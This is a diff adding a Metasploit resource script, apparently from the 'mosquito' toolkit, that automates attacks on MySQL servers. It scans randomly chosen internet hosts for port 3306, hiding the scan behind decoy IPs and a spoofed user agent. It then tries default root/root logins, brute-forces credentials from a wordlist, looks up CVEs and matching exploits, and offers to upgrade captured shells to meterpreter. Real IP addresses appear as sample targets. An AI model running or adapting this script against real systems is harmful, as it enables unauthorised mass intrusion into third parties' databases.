@@ -1,0 +1,321 @@
+##
+# Script: mysql_brute.rc
+# Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
+# GitHub: https://github.com/r00t-3xp10it/resource_files
+# -
+# setg SAVE_DB true - Save workspace mosquito to database.xml
+# setg LIMMIT 1000 - Limit the number of random rhosts to search
+# setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 3306 open
+# setg RHOSTS 213.171.197.190 46.242.242.249 - To instruct db_nmap to check targets for port 3306 open
+# setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
+# -
+# [SYNTAX EXAMPLES]
+# msf5 > setg RANDOM_HOSTS true;resource /root/mysql_brute.rc'
+# msfconsole -q -x 'setg RANDOM_HOSTS true;resource /root/mysql_brute.rc'
+##
+  <ruby>
+      run_single("workspace -a mosquito")
+      help = %Q|
+                                                🦟__________       
+              _______🦟________________________  ___(_) _  /______🦟
+           __  __  __ \\  __ \\_  ___/  __  /  / / /_  /_  __/  __ \\
+         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
+           /_/ /_/ /_/\\____//____/ \\__, / \\__,_/ /_/  \\__/ \\____/
+                                  🦟 /_/                       🦟
+
+    Script: mysql_brute.rc
+    Author: r00t-3xp10it <pedroubuntu10[at]gmail.com>
+    GitHub: https://github.com/r00t-3xp10it/resource_files
+
+      |
+      print_line(help)
+      Rex::sleep(2.0)
+
+      ## Make sure we are connected to db
+      unless framework.db.active
+        File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+        print_error("[ERROR] Database not connected to postgresql.")
+        Rex::sleep(2.0)
+        err = %Q|
+
+    Remark
+    ------
+    This resource script requires the msf database connected to postgresql.
+
+    Connect DB To Postgresql
+    ------------------------
+    [execute] service postgresql start
+    [execute] msfconsole -q -x 'resource mysql_brute.rc'
+
+        |
+        print_line(err)
+        print_error("please wait, cleaning recent configurations.")
+        run_single("unsetg all")
+        run_single("exit -y")
+        return nil
+      else
+        local = Dir.pwd
+        print_good("Database connected to postgresql.")
+        Rex::sleep(0.5)
+        work_name = framework.db.workspace.name
+        print_status("Working in workspace: *#{work_name}")
+        Rex::sleep(1.0)
+        ip_range = File.read("ip_range.txt") if File.exist?("ip_range.txt")
+      end
+
+      ## Sellect the type of nmap scan to use.
+      if (framework.datastore['RANDOM_HOSTS'] == "true")
+         if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
+           run_single("setg LIMMIT 800")
+           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
+         else
+           print_line("LIMMIT => #{framework.datastore['LIMMIT']}")
+           print_line("RHOSTS => Random Search in WAN for:#{framework.datastore['LIMMIT']} alive hosts")
+         end
+      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
+         run_single("setg RHOSTS #{ip_range}.0/24")
+      elsif (framework.datastore['RHOSTS'])
+         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
+      end
+
+      ## Metasploit auxiliarys brute force dicionary absoluct path
+      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
+         run_single("setg USERPASS_FILE #{local}/bin/wordlists/mysql-default-userpasslist.txt")
+      else
+         print_line("USERPASS_FILE => #{framework.datastore['USERPASS_FILE']}")
+      end
+
+      ## db_nmap WAN or RHOSTS scan settings
+      if (framework.datastore['RHOSTS'] == "#{ip_range}.0/24")
+         run_single("db_nmap -sS -v -Pn -n -T4 -O -p 3306 --open --script=banner.nse,http-headers.nse,mysql-enum.nse,mysql-info.nse,mysql-empty-password.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+      elsif (framework.datastore['RANDOM_HOSTS'] == "true")
+         print_status("Nmap: search for random remote hosts with ports 3306 open")
+         run_single("db_nmap -sS -vvv -Pn -n -T4 -iR #{framework.datastore['LIMMIT']} -p 3306 --open --script=banner.nse,http-headers.nse,mysql-enum.nse,mysql-info.nse,mysql-empty-password.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3")
+      else
+         run_single("db_nmap -sS -v -Pn -n -T4 -O -p 3306 --open --script=banner.nse,http-headers.nse,mysql-enum.nse,mysql-info.nse,mysql-empty-password.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" -D 172.217.17.4,65.49.82.3 #{framework.datastore['RHOSTS']}")
+      end
+
+      ## Read current database and declare local vars
+      if File.directory?("#{local}/logs")
+         run_single("spool #{local}/logs/mysql_brute.log")
+      end
+      print_line("")
+      run_single("services")
+
+      ## rhosts geolocation (geoip-bin)
+      if (File.exist?("/usr/bin/geoiplookup"))
+         print_line("Geo-Location")
+         print_line("------------")
+         ## Mapping database hosts (loop)
+         framework.db.hosts.map(&:address).each do |sHost|
+            geo_location = `geoiplookup #{sHost}|cut -d ':' -f2|tr -d '\n'`
+            spl_range = sHost.split('.')
+               ## Make sure we are NOT geolocating Internal ip(s)
+               if (spl_range[0] == "192" and spl_range[1] == "168")
+                  print_line("#{sHost} -  Not available (Internal IP Address)")
+               else
+                  print_line("#{sHost} - #{geo_location}")
+               end
+         end
+      end
+
+      print_line("")
+      Rex::sleep(2.0)
+      ## Read the database (metasploit)
+      print_good("Reading msfdb database for info.")
+      xhost = framework.db.hosts.map(&:address).join(' ')
+      xport = framework.db.services.map(&:port).join(' ')
+      proto = framework.db.services.map(&:proto).join(' ')
+      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
+
+         ## Make sure that exists hosts/ports (open?) in database
+         if xhost.nil? or xhost == '' or xhost == ' '
+              File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+              print_error("db_nmap scan did not find any alive connections.")
+              print_error("Please wait, cleaning recent configurations.")
+              Rex::sleep(1.0)
+              run_single("unsetg all")
+              run_single("workspace -d mosquito")
+              return nil
+         elsif xport.nil? or xport == '' or xport == ' '
+              File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+              print_error("db_nmap did not find any 3306 open ports.")
+              print_error("Please wait, cleaning recent configurations.")
+              Rex::sleep(1.0)
+              run_single("unsetg all")
+              run_single("workspace -d mosquito")
+              return nil
+         end
+
+      ## Make sure that freevulnseach.nse exists
+      Rex::sleep(2.0)
+      nse = "/usr/share/nmap/scripts/freevulnsearch.nse"
+      unless (File.exist?(nse))
+           print_error("[ERROR] freevulnsearch.nse/vulners.nse script(s) not found in nmap db.")
+           print_error("[ERROR] Download nse script(s) and install it before running this rc file.")
+           Rex::sleep(1.0)
+           nof = %Q|
+
+    How To Fix
+    ----------
+    Exit current session and msfconsole < exit AND exit -y >
+    Then execute the follow commands in a new terminal windows:
+
+    sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
+    sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
+    sudo nmap --script-updatedb
+
+    sudo wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
+    sudo cp vulners.nse /usr/share/nmap/scripts/vulners.nse
+    sudo nmap --script-updatedb
+
+           |
+           print_line(nof)
+           print_error("Please wait, cleaning recent configurations.")
+           Rex::sleep(1.0)
+           run_single("unsetg all")
+           run_single("workspace -d mosquito")
+           File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+           return nil
+      else
+           print_good("freevulnsearch.nse/vulners.nse script(s) found.")
+      end
+
+         run_single("setg RHOSTS #{xhost}")
+         Rex::sleep(2.0)
+         if xport =~ /3306/i or proto =~ /mysql/i
+              print_warning("Remote Target port 3306 mysql found.")
+              Rex::sleep(1.0)
+              run_single("use auxiliary/scanner/mysql/mysql_version")
+              run_single("set THREADS 20")
+              print_line("")
+              run_single("services -c name -S mysql -R")
+              run_single("exploit")
+              Rex::sleep(1.5)
+              ## TODO: trwou a error in msf
+              run_single("use auxiliary/admin/mysql/mysql_enum")
+              run_single("set USERNAME root")
+              run_single("set PASSWORD root")
+              run_single("set THREADS 20")
+              print_line("")
+              run_single("services -c name -S mysql -R")
+              run_single("exploit")
+              Rex::sleep(1.5)
+              run_single("use auxiliary/scanner/mysql/mysql_login")
+              count_lines = File.open("#{framework.datastore['USERPASS_FILE']}") { |f| f.count }
+              print_good("Wordlist Logins Count: #{count_lines}")
+              Rex::sleep(1.5)
+              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("set STOP_ON_SUCCESS true")
+              run_single("set VERBOSE true")
+              run_single("set THREADS 100")
+              print_line("")
+              run_single("services -c name -S mysql -R")
+              run_single("exploit")
+              Rex::sleep(1.5)
+       end
+
+         ## Running freevulnsearch.nse (scan for CVE's)
+         print "[?] Scan for possible CVE's? (y/n): "
+            question = gets.chomp
+
+         if question == "y" or question == "Y"
+            print "[?] Use 'freevulnsearch.nse' or 'vulners.nse'? :"
+            query_nse = gets.chomp
+            if query_nse.nil? or query_nse == ''
+                query_nse = "vulners.nse"
+            end
+            displ = %Q|
+
+         MMMMMMMMMMM'""""'YMMM  MM""MMMMM""MM  MM""""""""`MMMMMMMMMM
+         MMMMMMMMMM' .mmm. `MM  MM  MMMMM  MM  MM  mmmmmmmMMMMMMMMMM
+         MMMMMMMMMM  MMMMMooMM  MM  MMMMP  MM  MM`      MMMMMMMMMMMM 
+         MMMMMMMMMM  MMMMMMMMM  MM  MMMM' .MM  MM  MMMMMMMMMMMMMMMMM 
+         MMMMMMMMMM. `MMM' .MM  MM  MMP' .MMM  MM  MMMMMMMMMMMMMMMMM 
+         MMMMMMMMMMM.     .dMM  MM     .dMMMM  MM        .MMMMMMd@bM 
+         MMMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMMM  MMMMMMMMMMMMMMMMMMMMM
+                    freevulnsearch.nse by: Mathias Gut
+                         vulners.nse by: gmedian
+
+            |
+            print_line(displ)
+            print_good("[#{query_nse}] Running CVE checks againts: #{framework.datastore['RHOSTS']}")
+            run_single("db_nmap -sV -v -T4 -Pn -n --script=#{query_nse} #{framework.datastore['RHOSTS']} --open -oN CVEs.txt")
+            ## suggest exploits based on CVE number
+            query_numb = `cat CVEs.txt|grep -m 20 'CVE-'|awk {'print $2'}|cut -d '-' -f1,2,3`
+            # Make sure we get any CVE number back
+            parse_trail = query_numb.split(' ')
+            unless (parse_trail.empty? or parse_trail.nil? or parse_trail == '')
+                print "[?] Suggest exploits to CVEs found ? (y/n):"
+                query_cve = gets.chomp
+                if query_cve == "y" or query_cve == "Y"
+                    # Use msfconsole search core command to search for compatible exploits
+                    print_line("")
+                    print_good("searching in metasploit database for compatible exploits..")
+                    Rex::sleep(1.0)
+                    (parse_trail).each do |id|
+                       print_status("search cve:#{id} type:exploit rank:good rank:great rank:excellent")
+                       Rex::sleep(0.5)
+                       run_single("search cve:#{id} type:exploit rank:good rank:great rank:excellent")
+                       Rex::sleep(1.0)
+                    end
+                end
+            else
+                # None CVEs IDs found in nmap scans
+                print_error("[NONE CVEs FOUND] Abort Suggest exploits module execution.")
+                Rex::sleep(1.5)
+            end
+         end
+
+      ## Make sure logs folder exists!
+      if File.directory?("#{local}/logs")
+         ## Save current database to local file (xml)
+         if (framework.datastore['SAVE_DB'] == "true")
+            rand = Rex::Text.rand_text_alpha(5)
+            print_warning("Exporting database to: #{local}/logs/database_#{rand}.xml")
+            run_single("db_export -f xml -a #{local}/logs/database_#{rand}.xml")
+         end
+      end
+
+      print_line("")
+      ## Display active sessions
+      run_single("sessions -l")
+      print_line("")
+      run_single("creds")
+      print_line("")
+      ## Cleaning database and unset global variables
+      print_warning("Cleaning global variables.")
+      Rex::sleep(1.5)
+      run_single("unsetg all")
+      run_single("unset all")
+      run_single("workspace -d mosquito")
+
+      ## Upgrade command shell to meterpreter?
+      if (framework.sessions.length > 0)
+         print "[?] Upgrade command shell to meterpreter? (y/n):"
+         upgrate_met = gets.chomp
+         if upgrate_met == "y" or upgrate_met == "Y"
+         run_single("use post/multi/manage/shell_to_meterpreter")
+            # Loop truth sessions to grab the session ID
+            framework.sessions.each_key do |sid|
+               run_single("set SESSION #{sid}")
+               run_single("run")
+            end
+            print_line("")
+            run_single("sessions -l")
+            print_line("")
+         end
+      end
+
+      dtr = `date`
+      ## Writting ['xhost(s)'] to mosquito logfile
+      if File.directory?("#{local}/logs")
+         print_status("Logfile stored under: #{local}/logs/mysql_brute.log")
+         run_single("echo \"[#{dtr}] mysql_brute: #{xhost}\" >> logs/mosquito.log")
+      end
+
+      File.delete("CVEs.txt") if File.exist?("CVEs.txt")
+   File.delete("ip_range.txt") if File.exist?("ip_range.txt")
+   run_single("back")
+</ruby>
+
